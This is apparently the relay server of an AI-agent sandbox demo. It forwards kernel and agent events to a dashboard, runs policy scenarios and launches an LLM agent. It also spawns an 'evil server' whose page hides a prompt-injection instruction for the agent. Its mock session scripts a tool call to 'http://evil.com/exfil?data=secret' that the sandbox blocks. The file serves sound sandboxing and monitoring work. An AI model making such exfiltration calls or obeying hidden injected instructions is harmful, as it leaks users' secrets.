// P5 viewer — WebSocket relay + (optionally) static-dashboard server
//
// Sits between event senders (P2 daemon, P4 orchestrator) and event viewers
// (the React dashboard in the browser). Does not generate real events itself;
// it just forwards JSON messages from senders to all connected viewers.
//
// Each new client must send a handshake within HANDSHAKE_TIMEOUT_MS:
//   { "role": "sender", "name": "p4-orchestrator" }   // pushes events in
//   { "role": "viewer" }                               // receives events out
// If no handshake arrives in time, the client is classified as a viewer.
//
// Run modes:
//   node server.js                  # relay only (HTTP root prints a hint)
//   MOCK_EVENTS=1 node server.js    # also emit fake events every 2s
//   SERVE_STATIC=1 node server.js   # also serve viewer-app/dist on same port
//                                   #   (this is what start-viewer.sh uses)

const http = require('http');
const fs = require('fs');
const path = require('path');
const { WebSocketServer, WebSocket } = require('ws');
const { runScenario, listScenarios, RunnerError } = require('./runner');
const { loadPermissions } = require('./manifest');
const policyStore = require('./policy_store');

const PORT = Number(process.env.PORT) || 8765;
// Default loopback-only: the relay forwards privileged kernel events with no
// origin check or per-event signature, so the only thing keeping a network
// peer from spoofing or harvesting them is who can reach the socket.
// Override via HOST=0.0.0.0 only if you understand and accept that exposure.
const HOST = process.env.HOST || '127.0.0.1';
const HANDSHAKE_TIMEOUT_MS = 3000;
const MOCK_INTERVAL_MS = 2000;
const MOCK_ENABLED = process.env.MOCK_EVENTS === '1';
const SERVE_STATIC = process.env.SERVE_STATIC === '1';
// Optional shared secret. When set, the sender handshake must include
// { token: VIEWER_TOKEN } or it will be rejected. Viewers are unauthenticated
// (loopback bind is the access control there).
const VIEWER_TOKEN = process.env.VIEWER_TOKEN || '';
// Cap individual WebSocket frames so a hostile sender cannot drive memory
// growth via a single huge message.
const WS_MAX_PAYLOAD = Number(process.env.WS_MAX_PAYLOAD) || 1 * 1024 * 1024;
// Drop a viewer whose internal send buffer exceeds this — slow viewers must
// not back up the relay across all other consumers.
const WS_MAX_BUFFER  = Number(process.env.WS_MAX_BUFFER) || 8 * 1024 * 1024;

// dist/ lives next to viewer-app/, which lives next to server/.
const DIST_ROOT = path.resolve(__dirname, '..', 'viewer-app', 'dist');

// Scenario / policy runner config — overridable via env so a different
// deployment doesn't need a code edit. Defaults match the Vagrant VM
// layout the rest of this repo assumes.
const SCENARIOS_DIR = process.env.SCENARIOS_DIR ||
  '/home/vagrant/agentsandbox/examples/playground';
const AGENTCTL_CMD  = process.env.AGENTCTL_CMD  || 'sudo';
const AGENTCTL_BASE_ARGS = process.env.AGENTCTL_BASE_ARGS
  ? process.env.AGENTCTL_BASE_ARGS.split(' ')
  : ['-n', '/home/vagrant/agentsandbox/bin/agentctl', '--socket=/run/agent-sandbox.sock', 'run', '-f'];
const SCENARIO_TIMEOUT_MS = Number(process.env.SCENARIO_TIMEOUT_MS) || 60_000;
const SCENARIOS_ENABLED = process.env.SCENARIOS_DISABLED !== '1';
const SCENARIO_MAX_INFLIGHT = Number(process.env.SCENARIO_MAX_INFLIGHT) || 4;
let scenarioInflight = 0;

// In-memory tracker of recent agent runs. Populated when /api/scenarios/run
// (or /api/bindings) fires a scenario; the v2 dashboard's "active agents"
// view reads /api/agents which serves this. Bounded to AGENT_HISTORY_MAX so
// a long-running session doesn't grow without bound.
const AGENT_HISTORY_MAX = 32;
const agentHistory: any[] = []; // newest-last; entries: { policy_id, name, started_at, exit_code, ok, last_message }

function recordAgentRun(entry: any): void {
  agentHistory.push(entry);
  if (agentHistory.length > AGENT_HISTORY_MAX) agentHistory.shift();
}

function patchLastAgentRun(predicate: (e: any) => boolean, patch: any): boolean {
  for (let i = agentHistory.length - 1; i >= 0; i--) {
    if (predicate(agentHistory[i])) {
      Object.assign(agentHistory[i], patch);
      return true;
    }
  }
  return false;
}

const senders = new Set<any>();
const viewers = new Set<any>();

let nextClientId = 1;

// Auto-start orchestrator/evil_server.py so the prompt-injection demo
// (scenario 08) is self-contained — the LLM fetches the page from this
// server and sees the hidden injection instruction. Disable by setting
// EVIL_SERVER_DISABLED=1; override the port via EVIL_SERVER_PORT (also
// flow into the manifest's allowed_hosts).
const EVIL_SERVER_PORT = Number(process.env.EVIL_SERVER_PORT) || 8888;
const EVIL_SERVER_DISABLED = process.env.EVIL_SERVER_DISABLED === '1';
const EVIL_SERVER_SCRIPT = process.env.EVIL_SERVER_SCRIPT ||
  '/home/vagrant/agentsandbox/orchestrator/evil_server.py';
let evilServerChild: any = null;
function maybeStartEvilServer(): void {
  if (EVIL_SERVER_DISABLED) return;
  // If the port is already taken, assume someone (a previous viewer
  // session, a manual run) is already serving it and don't double-start.
  const probe = require('node:net').createConnection({ host: '127.0.0.1', port: EVIL_SERVER_PORT, timeout: 250 });
  probe.on('connect', () => { probe.destroy(); });
  probe.on('timeout', () => { probe.destroy(); spawnEvilServer(); });
  probe.on('error', () => { spawnEvilServer(); });
}
function spawnEvilServer() {
  if (evilServerChild) return;
  try {
    evilServerChild = require('node:child_process').spawn(
      process.env.LLM_AGENT_PYTHON || 'python3',
      [EVIL_SERVER_SCRIPT],
      { detached: true, stdio: ['ignore', 'pipe', 'pipe'] },
    );
    evilServerChild.unref();
    log(`evil-server: spawned pid=${evilServerChild.pid} on :${EVIL_SERVER_PORT} (script=${EVIL_SERVER_SCRIPT})`);
    evilServerChild.stderr.on('data', (b: Buffer) => process.stderr.write(`[evil-server] ${b}`));
    evilServerChild.on('close', (code: number | null) => {
      log(`evil-server: exit code=${code}`);
      evilServerChild = null;
    });
  } catch (err: any) {
    warn(`evil-server: spawn failed (${err.message}) — prompt-injection demo will fail until it is started manually`);
  }
}
maybeStartEvilServer();

const recentEventsBuffer: any[] = [];
const BUFFER_MAX = 20;

function getRecentEvents(): any[] {
  return recentEventsBuffer.slice();
}

function ts() {
  return new Date().toISOString();
}

function log(...args: any[]) {
  console.log(`[${ts()}]`, ...args);
}

function warn(...args: any[]) {
  console.warn(`[${ts()}]`, ...args);
}

function describe(client: any): string {
  const role = client.role || 'unknown';
  const name = client.name ? ` "${client.name}"` : '';
  return `#${client.id} ${role}${name}`;
}

function broadcastToViewers(rawJson: string, fromClient?: any): void {
  try {
    const parsed = JSON.parse(rawJson);
    if (parsed && typeof parsed === 'object') {
      recentEventsBuffer.push(parsed);
      if (recentEventsBuffer.length > BUFFER_MAX) recentEventsBuffer.shift();
    }
  } catch {
    // malformed JSON — skip buffering, still relay
  }

  if (viewers.size === 0) return;
  let delivered = 0;
  let dropped = 0;
  // Iterate over a snapshot so we can mutate viewers as we go.
  for (const viewer of [...viewers]) {
    if (viewer.ws.readyState !== WebSocket.OPEN) continue;
    if (viewer.ws.bufferedAmount > WS_MAX_BUFFER) {
      // Slow viewer: closing 1011 is "internal error", which is the closest
      // standard code for "we're dropping you to protect everyone else".
      warn(`dropping slow viewer ${describe(viewer)} (bufferedAmount=${viewer.ws.bufferedAmount})`);
      try { viewer.ws.close(1011, 'backpressure'); } catch (_) {}
      viewers.delete(viewer);
      dropped += 1;
      continue;
    }
    viewer.ws.send(rawJson);
    delivered += 1;
  }
  if (fromClient) {
    if (dropped > 0) {
      log(`relayed event from ${describe(fromClient)} → ${delivered} viewer(s), dropped ${dropped} slow`);
    } else {
      log(`relayed event from ${describe(fromClient)} → ${delivered} viewer(s)`);
    }
  }
}

function handleHandshake(client: any, msg: any): boolean {
  const role = msg && msg.role;
  if (role === 'sender') {
    if (VIEWER_TOKEN && msg.token !== VIEWER_TOKEN) {
      warn(`handshake: ${describe(client)} rejected (sender token mismatch)`);
      try { client.ws.close(4401, 'unauthorized'); } catch (_) {}
      return false;
    }
    client.role = 'sender';
    client.name = typeof msg.name === 'string' ? msg.name : 'unnamed-sender';
    senders.add(client);
    log(`handshake: ${describe(client)} registered (${senders.size} sender(s) total)`);
  } else if (role === 'viewer') {
    client.role = 'viewer';
    viewers.add(client);
    log(`handshake: ${describe(client)} registered (${viewers.size} viewer(s) total)`);
  } else {
    warn(`handshake: ${describe(client)} sent unknown role "${role}", defaulting to viewer`);
    client.role = 'viewer';
    viewers.add(client);
  }
  return true;
}

function defaultToViewer(client: any): void {
  if (client.role) return;
  client.role = 'viewer';
  viewers.add(client);
  warn(
    `handshake timeout after ${HANDSHAKE_TIMEOUT_MS}ms for ${describe(client)}, ` +
      `defaulting to viewer (${viewers.size} viewer(s) total)`
  );
}

function removeClient(client: any): void {
  if (client.role === 'sender') senders.delete(client);
  else if (client.role === 'viewer') viewers.delete(client);
}

// ---------------------------------------------------------------------------
// Static-file handler — serves viewer-app/dist/ when SERVE_STATIC=1.
// Hand-rolled to avoid pulling in serve-static / express. Vite emits a tiny
// set of file types so the content-type table stays small.
// ---------------------------------------------------------------------------
const CONTENT_TYPES = {
  '.html':  'text/html; charset=utf-8',
  '.js':    'application/javascript; charset=utf-8',
  '.mjs':   'application/javascript; charset=utf-8',
  '.css':   'text/css; charset=utf-8',
  '.json':  'application/json; charset=utf-8',
  '.map':   'application/json; charset=utf-8',
  '.svg':   'image/svg+xml',
  '.png':   'image/png',
  '.jpg':   'image/jpeg',
  '.jpeg':  'image/jpeg',
  '.ico':   'image/x-icon',
  '.woff':  'font/woff',
  '.woff2': 'font/woff2',
  '.ttf':   'font/ttf',
  '.txt':   'text/plain; charset=utf-8',
};

function contentTypeFor(filePath: string): string {
  const ext = path.extname(filePath).toLowerCase();
  return (CONTENT_TYPES as Record<string, string>)[ext] || 'application/octet-stream';
}

function sendPlain(res: any, status: number, body: string): void {
  res.writeHead(status, { 'Content-Type': 'text/plain; charset=utf-8' });
  res.end(body);
}

function sendJson(res: any, status: number, obj: any): void {
  const body = JSON.stringify(obj);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Content-Length': Buffer.byteLength(body),
    'Cache-Control': 'no-store',
  });
  res.end(body);
}

function readJsonBody(req: any, maxBytes = 64 * 1024): Promise<any> {
  return new Promise<any>((resolve, reject) => {
    let total = 0;
    const chunks: Buffer[] = [];
    req.on('data', (chunk: Buffer) => {
      total += chunk.length;
      if (total > maxBytes) {
        const err: any = new Error('request body too large');
        err.httpStatus = 413;
        req.destroy();
        reject(err);
        return;
      }
      chunks.push(chunk);
    });
    req.on('end', () => {
      const text = Buffer.concat(chunks).toString('utf8') || '{}';
      try {
        resolve(JSON.parse(text));
      } catch (err: any) {
        const wrapped: any = new Error(`invalid JSON: ${err.message}`);
        wrapped.httpStatus = 400;
        reject(wrapped);
      }
    });
    req.on('error', reject);
  });
}

// Spawn a scenario by stem (e.g. "01-baseline-allowed"). Tracks the agent
// run in agentHistory for the dashboard's "active agents" view. Returns
// the runner result object. Throws RunnerError or PolicyStoreError on
// failure; caller maps to HTTP status.
async function fireScenario(stem: string, originHint: string = 'api'): Promise<any> {
  if (scenarioInflight >= SCENARIO_MAX_INFLIGHT) {
    const e: any = new Error(`at most ${SCENARIO_MAX_INFLIGHT} concurrent runs`);
    e.code = 'too_many_inflight';
    throw e;
  }
  scenarioInflight += 1;
  const startedAt = new Date().toISOString();
  recordAgentRun({
    name: stem,
    origin: originHint,
    started_at: startedAt,
    state: 'running',
  });
  log(`scenario run requested: stem=${JSON.stringify(stem)} origin=${originHint} inflight=${scenarioInflight}`);
  try {
    const result = await runScenario(stem, {
      manifestsDir: SCENARIOS_DIR,
      command: AGENTCTL_CMD,
      baseArgs: AGENTCTL_BASE_ARGS,
      timeoutMs: SCENARIO_TIMEOUT_MS,
    });
    patchLastAgentRun(
      (e: any) => e.name === stem && e.started_at === startedAt,
      {
        state: 'finished',
        ok: result.ok,
        exit_code: result.exitCode,
        last_message: result.ok ? `exit ${result.exitCode}` :
          (result.stderr ? result.stderr.split('\n')[0] : `exit ${result.exitCode}`),
      },
    );
    return result;
  } catch (err: any) {
    patchLastAgentRun(
      (e: any) => e.name === stem && e.started_at === startedAt,
      { state: 'errored', ok: false, last_message: err.message },
    );
    throw err;
  } finally {
    scenarioInflight -= 1;
  }
}

// /api/* dispatcher. Returns true if it answered the request.
async function handleApiRequest(req: any, res: any, urlPath: string): Promise<boolean> {
  // Health: a flat 200 the v2 UI's pingDaemon polls every 10s. The relay
  // is the right thing to check liveness against — if it's reachable, the
  // dashboard can do everything it offers.
  if (req.method === 'GET' && urlPath === '/api/healthz') {
    sendJson(res, 200, { ok: true, ts: ts(), inflight: scenarioInflight });
    return true;
  }

  // Scenarios — list (each entry includes its parsed permissions).
  if (req.method === 'GET' && urlPath === '/api/scenarios') {
    if (!SCENARIOS_ENABLED) {
      sendJson(res, 200, { enabled: false, scenarios: [] });
      return true;
    }
    try {
      const stems = await listScenarios({ manifestsDir: SCENARIOS_DIR });
      const scenarios = await Promise.all(stems.map(async (name: string) => {
        const r = await loadPermissions(name, SCENARIOS_DIR);
        if (r.ok) return { name, permissions: r.summary };
        return { name, permissions: null, parse_error: r.error };
      }));
      sendJson(res, 200, { enabled: true, scenarios, dir: SCENARIOS_DIR });
    } catch (err: any) {
      warn(`/api/scenarios: ${err.message}`);
      sendJson(res, 500, { error: 'list_failed', message: err.message });
    }
    return true;
  }

  // Scenarios — run by stem.
  if (req.method === 'POST' && urlPath === '/api/scenarios/run') {
    if (!SCENARIOS_ENABLED) {
      sendJson(res, 503, { error: 'scenarios_disabled' });
      return true;
    }
    let body: any;
    try { body = await readJsonBody(req); }
    catch (err: any) { sendJson(res, err.httpStatus || 400, { error: 'bad_body', message: err.message }); return true; }
    try {
      const result = await fireScenario(body && body.name, 'scenario_runner');
      sendJson(res, 200, {
        ok: result.ok, exit_code: result.exitCode, signal: result.signal,
        stdout: result.stdout, stderr: result.stderr, scenario: body && body.name,
      });
    } catch (err: any) {
      if (err && err.code === 'too_many_inflight') {
        sendJson(res, 429, { error: err.code, message: err.message });
      } else if (err instanceof RunnerError) {
        const status = err.code === 'invalid_name' ? 400 :
          err.code === 'not_found' ? 404 :
          err.code === 'timeout' ? 504 : 500;
        sendJson(res, status, { error: err.code, message: err.message });
      } else {
        warn(`scenario run failed: ${err.stack || err.message}`);
        sendJson(res, 500, { error: 'internal', message: err.message });
      }
    }
    return true;
  }

  // Policies — list. Backed by examples/playground/*.yaml files.
  if (req.method === 'GET' && urlPath === '/api/policies') {
    try {
      const policies = await policyStore.listAll(SCENARIOS_DIR);
      sendJson(res, 200, policies);
    } catch (err: any) {
      warn(`/api/policies list: ${err.message}`);
      sendJson(res, 500, { error: 'list_failed', message: err.message });
    }
    return true;
  }

  // Policies — create.
  if (req.method === 'POST' && urlPath === '/api/policies') {
    let body;
    try { body = await readJsonBody(req); }
    catch (err: any) { sendJson(res, err.httpStatus || 400, { error: 'bad_body', message: err.message }); return true; }
    try {
      const created = await policyStore.create(body, SCENARIOS_DIR);
      sendJson(res, 201, created);
    } catch (err: any) {
      if (err instanceof policyStore.PolicyStoreError) {
        const status = err.code === 'invalid' ? 400 :
          err.code === 'conflict' ? 409 : 500;
        sendJson(res, status, { error: err.code, message: err.message });
      } else {
        warn(`/api/policies create: ${err.stack || err.message}`);
        sendJson(res, 500, { error: 'internal', message: err.message });
      }
    }
    return true;
  }

  // Policies — get / update / delete by id.
  const policyMatch = /^\/api\/policies\/(\d+)$/.exec(urlPath);
  if (policyMatch) {
    const id = Number(policyMatch[1]);
    if (req.method === 'GET') {
      try { sendJson(res, 200, await policyStore.getById(id, SCENARIOS_DIR)); }
      catch (err: any) {
        if (err instanceof policyStore.PolicyStoreError && err.code === 'not_found') {
          sendJson(res, 404, { error: err.code, message: err.message });
        } else {
          sendJson(res, 500, { error: 'internal', message: err.message });
        }
      }
      return true;
    }
    if (req.method === 'PUT') {
      let body;
      try { body = await readJsonBody(req); }
      catch (err: any) { sendJson(res, err.httpStatus || 400, { error: 'bad_body', message: err.message }); return true; }
      try {
        const updated = await policyStore.update(id, body, SCENARIOS_DIR);
        sendJson(res, 200, updated);
      } catch (err: any) {
        if (err instanceof policyStore.PolicyStoreError) {
          const status = err.code === 'invalid' ? 400 :
            err.code === 'not_found' ? 404 : 500;
          sendJson(res, status, { error: err.code, message: err.message });
        } else {
          sendJson(res, 500, { error: 'internal', message: err.message });
        }
      }
      return true;
    }
    if (req.method === 'DELETE') {
      try {
        await policyStore.remove(id, SCENARIOS_DIR);
        res.writeHead(204); res.end();
      } catch (err: any) {
        if (err instanceof policyStore.PolicyStoreError && err.code === 'not_found') {
          sendJson(res, 404, { error: err.code, message: err.message });
        } else {
          sendJson(res, 500, { error: 'internal', message: err.message });
        }
      }
      return true;
    }
  }

  // Policies — next id helper for the "create" form.
  if (req.method === 'GET' && urlPath === '/api/policies/next-id') {
    try { sendJson(res, 200, { id: await policyStore.nextId(SCENARIOS_DIR) }); }
    catch (err: any) { sendJson(res, 500, { error: 'internal', message: err.message }); }
    return true;
  }

  // Bindings — re-fire a policy as a scenario. The v2 BindingsForm sends
  // { cgroup_id, policy_id }; we treat cgroup_id as a free-form display
  // label and use policy_id to look up the YAML to run. policy_id=0 is
  // historically "remove binding" which we treat as a no-op.
  if (req.method === 'POST' && urlPath === '/api/bindings') {
    let body;
    try { body = await readJsonBody(req); }
    catch (err: any) { sendJson(res, err.httpStatus || 400, { error: 'bad_body', message: err.message }); return true; }
    const policyId = Number(body && body.policy_id);
    if (policyId === 0) { res.writeHead(204); res.end(); return true; }
    if (!Number.isInteger(policyId) || policyId < 1) {
      sendJson(res, 400, { error: 'invalid', message: 'policy_id must be a positive integer (or 0 to unbind)' });
      return true;
    }
    try {
      const stem = await policyStore.scenarioStemForId(policyId, SCENARIOS_DIR);
      // Fire-and-record. The wire reply tells the UI both the immediate
      // exec result AND echoes the binding so the form can confirm.
      const result = await fireScenario(stem, `binding cgroup_id=${body && body.cgroup_id}`);
      sendJson(res, 200, {
        ok: result.ok, exit_code: result.exitCode, signal: result.signal,
        stdout: result.stdout, stderr: result.stderr,
        binding: { cgroup_id: body && body.cgroup_id, policy_id: policyId, scenario: stem },
      });
    } catch (err: any) {
      if (err && err.code === 'too_many_inflight') {
        sendJson(res, 429, { error: err.code, message: err.message });
      } else if (err instanceof policyStore.PolicyStoreError) {
        sendJson(res, err.code === 'not_found' ? 404 : 400, { error: err.code, message: err.message });
      } else if (err instanceof RunnerError) {
        sendJson(res, 500, { error: err.code, message: err.message });
      } else {
        warn(`/api/bindings: ${err.stack || err.message}`);
        sendJson(res, 500, { error: 'internal', message: err.message });
      }
    }
    return true;
  }

  // Active agents — most-recent first slice of agentHistory.
  if (req.method === 'GET' && urlPath === '/api/agents') {
    sendJson(res, 200, { agents: agentHistory.slice().reverse() });
    return true;
  }

  // LLM agent — fire the orchestrator's run_llm_agent.py with a task.
  // The script publishes session_start / tool_call / agent_output events
  // directly to the relay's WebSocket, so the dashboard's workflow tab
  // sees them in real time without us shuttling the stdout back.
  //
  // We do not wait for the spawn — LLM turns can take 10+ seconds and the
  // dashboard is the right place to observe progress. The endpoint
  // returns 202 with the launched PID; agentHistory tracks the run.
  if (req.method === 'POST' && urlPath === '/api/llm/run') {
    let body;
    try { body = await readJsonBody(req); }
    catch (err: any) { sendJson(res, err.httpStatus || 400, { error: 'bad_body', message: err.message }); return true; }
    const task = (body && body.task) || '';
    if (typeof task !== 'string' || task.trim() === '') {
      sendJson(res, 400, { error: 'invalid', message: 'task must be a non-empty string' });
      return true;
    }
    const scriptPath = process.env.LLM_AGENT_SCRIPT ||
      '/home/vagrant/agentsandbox/orchestrator/run_llm_agent.py';
    const pythonBin = process.env.LLM_AGENT_PYTHON || 'python3';
    let child;
    try {
      child = require('node:child_process').spawn(pythonBin, [scriptPath, task], {
        // Inherit env so OPENAI_API_KEY / OPENAI_BASE_URL flow through (the
        // script also reads orchestrator/.env via python-dotenv as a
        // fallback). detached + ignored stdio so the parent can return
        // immediately without leaving zombies.
        env: process.env,
        detached: true,
        stdio: ['ignore', 'pipe', 'pipe'],
      });
    } catch (err: any) {
      sendJson(res, 500, { error: 'spawn_failed', message: err.message });
      return true;
    }
    const startedAt = new Date().toISOString();
    recordAgentRun({
      name: 'llm-agent',
      origin: `llm task=${task.slice(0, 60)}${task.length > 60 ? '…' : ''}`,
      started_at: startedAt,
      state: 'running',
      pid: child.pid,
    });
    // Stream a one-line log when the child exits so the operator can see
    // it in the relay's stderr; we don't gate the response on it.
    let stderrBuf = '';
    child.stderr.on('data', (b: Buffer) => { stderrBuf += b.toString('utf8'); });
    child.on('close', (code: number | null, signal: string | null) => {
      patchLastAgentRun(
        (e: any) => e.name === 'llm-agent' && e.started_at === startedAt,
        { state: 'finished', ok: code === 0, exit_code: code, last_message:
          code === 0 ? `exit 0` : (stderrBuf.split('\n').filter(Boolean).slice(-1)[0] || `exit ${code}`) },
      );
      log(`llm agent exit pid=${child.pid} code=${code} signal=${signal || ''}`);
    });
    child.unref();
    sendJson(res, 202, { ok: true, pid: child.pid, started_at: startedAt });
    return true;
  }

  return false;
}

function sendStaticFile(req: any, res: any, filePath: string): void {
  fs.stat(filePath, (statErr: any, stats: any) => {
    if (statErr || !stats.isFile()) {
      sendPlain(res, 404, `not found: ${req.url}\n`);
      return;
    }
    const headers: Record<string, any> = {
      'Content-Type': contentTypeFor(filePath),
      'Content-Length': stats.size,
    };
    // Vite emits hashed filenames in /assets, so they're safe to cache hard.
    // index.html must always be re-fetched so a rebuild is picked up.
    if (filePath.includes(`${path.sep}assets${path.sep}`)) {
      headers['Cache-Control'] = 'public, max-age=31536000, immutable';
    } else {
      headers['Cache-Control'] = 'no-cache';
    }
    res.writeHead(200, headers);
    fs.createReadStream(filePath).pipe(res);
  });
}

function handleHttpRequest(req: any, res: any): void {
  let urlPath: string;
  try {
    urlPath = decodeURIComponent((req.url || '/').split('?')[0]);
  } catch {
    sendPlain(res, 400, 'bad request\n');
    return;
  }

  // /api/* — JSON endpoints (policies, scenarios, agents, healthz).
  // These must be dispatched before the GET-only static check so POST/PUT/
  // DELETE work. handleApiRequest answers itself; if it returns false we
  // fall through with a 404.
  if (urlPath.startsWith('/api/')) {
    handleApiRequest(req, res, urlPath).then((handled: boolean) => {
      if (!handled) sendJson(res, 404, { error: 'not_found', path: urlPath });
    }).catch((err: any) => {
      warn(`API handler crashed: ${err.stack || err.message}`);
      try { sendJson(res, 500, { error: 'internal', message: err.message }); } catch (_) {}
    });
    return;
  }

  if (req.method !== 'GET' && req.method !== 'HEAD') {
    sendPlain(res, 405, 'method not allowed\n');
    return;
  }

  if (!SERVE_STATIC) {
    // Relay-only mode — just answer with a friendly hint so curl/wget on the
    // port get something readable instead of a hang.
    sendPlain(
      res,
      200,
      'P5 viewer relay (WebSocket only on this port).\n' +
        'Set SERVE_STATIC=1 — or run viewer/scripts/start-viewer.sh — to also serve the dashboard here.\n',
    );
    return;
  }

  if (urlPath === '/' || urlPath === '') urlPath = '/index.html';

  // Resolve and confirm the result is inside DIST_ROOT — refuse traversal.
  const resolved = path.resolve(DIST_ROOT, '.' + urlPath);
  if (resolved !== DIST_ROOT && !resolved.startsWith(DIST_ROOT + path.sep)) {
    sendPlain(res, 403, 'forbidden\n');
    return;
  }

  // If dist hasn't been built, fail loud rather than silently 404 every asset.
  fs.access(DIST_ROOT, fs.constants.R_OK, (distErr: any) => {
    if (distErr) {
      sendPlain(
        res,
        503,
        'dashboard build not found (viewer/viewer-app/dist).\n' +
          'Run viewer/scripts/start-viewer.sh to build and serve.\n',
      );
      return;
    }
    sendStaticFile(req, res, resolved);
  });
}

// ---------------------------------------------------------------------------
// HTTP + WebSocket server — share one TCP port. ws attaches via { server }
// and intercepts only Upgrade requests, leaving plain GETs to handleHttpRequest.
// ---------------------------------------------------------------------------
const httpServer = http.createServer(handleHttpRequest);
const wss = new WebSocketServer({ server: httpServer, maxPayload: WS_MAX_PAYLOAD });

httpServer.on('listening', () => {
  log(`WebSocket relay listening on ws://${HOST}:${PORT}`);
  if (HOST !== '127.0.0.1' && HOST !== 'localhost' && HOST !== '::1') {
    warn(`HOST=${HOST} binds non-loopback — kernel events are exposed to anything that can reach this port. Set VIEWER_TOKEN to require sender authentication.`);
  }
  if (SERVE_STATIC) {
    log(`serving dashboard at http://${HOST}:${PORT}  (dist: ${DIST_ROOT})`);
  } else {
    log('static dashboard: disabled (set SERVE_STATIC=1 to enable)');
  }
  log(`mock events: ${MOCK_ENABLED ? 'ENABLED (every ' + MOCK_INTERVAL_MS + 'ms)' : 'disabled'}`);
  log(`sender auth: ${VIEWER_TOKEN ? 'required (VIEWER_TOKEN set)' : 'disabled (set VIEWER_TOKEN to require)'}`);
});

httpServer.on('error', (err: any) => {
  warn('server error:', err.message);
});

wss.on('error', (err: any) => {
  warn('ws server error:', err.message);
});

wss.on('connection', (ws: any, req: any) => {
  const client: any = {
    id: nextClientId++,
    ws,
    role: null,
    name: null,
    remote: req.socket.remoteAddress,
  };

  log(`connection opened: ${describe(client)} from ${client.remote}`);

  const handshakeTimer = setTimeout(() => defaultToViewer(client), HANDSHAKE_TIMEOUT_MS);

  ws.on('message', (raw: any) => {
    const text = raw.toString();

    // First message must be the handshake.
    if (!client.role) {
      clearTimeout(handshakeTimer);
      let parsed;
      try {
        parsed = JSON.parse(text);
      } catch (err: any) {
        warn(`bad handshake JSON from ${describe(client)}: ${err.message} — defaulting to viewer`);
        client.role = 'viewer';
        viewers.add(client);
        return;
      }
      handleHandshake(client, parsed);
      // handleHandshake closes the socket on auth failure; the close event
      // will run removeClient. Nothing else to do here.
      return;
    }

    // After handshake: only senders push events; viewers shouldn't be sending.
    if (client.role === 'viewer') {
      warn(`ignoring message from viewer ${describe(client)} (viewers are read-only)`);
      return;
    }

    // Validate the JSON before relaying so we don't poison the viewer feed.
    let event;
    try {
      event = JSON.parse(text);
    } catch (err: any) {
      warn(`bad event JSON from ${describe(client)}: ${err.message} — dropping`);
      return;
    }
    if (!event || typeof event !== 'object' || typeof event.type !== 'string') {
      warn(`event from ${describe(client)} missing 'type' field — dropping`);
      return;
    }

    broadcastToViewers(text, client);
  });

  ws.on('close', (code: number, reason: any) => {
    clearTimeout(handshakeTimer);
    removeClient(client);
    const reasonStr = reason && reason.length ? ` reason="${reason.toString()}"` : '';
    log(
      `connection closed: ${describe(client)} code=${code}${reasonStr} ` +
        `(${senders.size} sender(s), ${viewers.size} viewer(s) remaining)`
    );
  });

  ws.on('error', (err: any) => {
    warn(`socket error on ${describe(client)}: ${err.message}`);
  });
});

httpServer.listen(PORT, HOST);

// Optional mock event emitter so the pipeline can be tested without P2/P4.
// Plays a scripted demo session in order, then pauses and repeats.
function startMockEmitter() {
  const fakeClient = { id: 0, role: 'sender', name: 'mock-emitter', ws: null };

  // Each entry: [delay_ms_from_session_start, event_object]
  // Kernel events are interleaved between tool_call and tool_result at realistic timestamps.
  const SCRIPT: Array<[number, any]> = [
    [   0, { agent: 'demo-agent', type: 'session_start', data: { launch_mode: 'local', command: ['python', 'demo_agent.py'], allowed_hosts: ['llm-proxy.dev.outshift.ai', 'example.com'], mode: 'enforce', pid: 12345 } }],
    [ 900, { agent: 'demo-agent', type: 'user_input',    data: { text: 'Fetch https://example.com and summarize the content for me', raw: '[USER] Fetch https://example.com and summarize it' } }],
    [1800, { agent: 'demo-agent', type: 'stdout',        data: { line: 'Thinking about the task...' } }],
    [2400, { agent: 'demo-agent', type: 'tool_call',     data: { tool: 'fetch_url', args: { url: 'https://example.com' } } }],
    [2600, { agent: 'demo-agent', type: 'connect_attempt', data: { dst_ip: '93.184.216.34', dst_port: 443, hostname: 'example.com' } }],
    [2800, { agent: 'demo-agent', type: 'connect_allowed', data: { dst_ip: '93.184.216.34', dst_port: 443, hostname: 'example.com', reason: 'in allowed_hosts' } }],
    [3600, { agent: 'demo-agent', type: 'tool_result',   data: { tool: 'fetch_url', ok: true,  url: 'https://example.com',       status_code: 200,  chars: 412, preview: 'Example Domain...', raw: '[RESULT] ok' } }],
    [4500, { agent: 'demo-agent', type: 'tool_call',     data: { tool: 'fetch_url', args: { url: 'http://evil.com/exfil?data=secret' } } }],
    [4700, { agent: 'demo-agent', type: 'connect_attempt', data: { dst_ip: '203.0.113.42', dst_port: 80, hostname: 'evil.com' } }],
    [4900, { agent: 'demo-agent', type: 'connect_blocked', data: { dst_ip: '203.0.113.42', dst_port: 80, hostname: 'evil.com', reason: 'no policy match' } }],
    [5100, { agent: 'demo-agent', type: 'tool_result',   data: { tool: 'fetch_url', ok: false, url: 'http://evil.com/exfil?data=secret', status_code: null, chars: 0,   preview: '',                raw: '[RESULT] blocked' } }],
    [6200, { agent: 'demo-agent', type: 'agent_output',  data: { text: 'Here is a summary of example.com: it is a sample domain used for illustrative purposes in documentation.', raw: '[AGENT] Here is a summary...' } }],
    [7000, { agent: 'demo-agent', type: 'stopped',       data: { exit_code: 0 } }],
  ];

  const REPEAT_PAUSE_MS = 6000; // pause between sessions

  function runSession() {
    const sessionId = `demo-agent-${Math.random().toString(36).slice(2, 8)}`;
    log(`mock: starting demo session ${sessionId}`);

    for (const [delay, template] of SCRIPT) {
      setTimeout(() => {
        const event = { ...template, ts: Date.now() / 1000, session_id: sessionId };
        broadcastToViewers(JSON.stringify(event), fakeClient);
      }, delay);
    }

    const lastDelay = SCRIPT[SCRIPT.length - 1][0];
    setTimeout(runSession, lastDelay + REPEAT_PAUSE_MS);
  }

  runSession();
}

if (MOCK_ENABLED) startMockEmitter();

const { startAnalyser } = require('./analyser');
startAnalyser(getRecentEvents, (rawJson: string) => broadcastToViewers(rawJson, null));

function shutdown(signal: string): void {
  log(`received ${signal}, closing server...`);
  wss.close();
  httpServer.close(() => {
    log('server closed, goodbye');
    process.exit(0);
  });
  // Hard exit if clients block close.
  setTimeout(() => process.exit(0), 1500).unref();
}

process.on('SIGINT', () => shutdown('SIGINT'));
process.on('SIGTERM', () => shutdown('SIGTERM'));
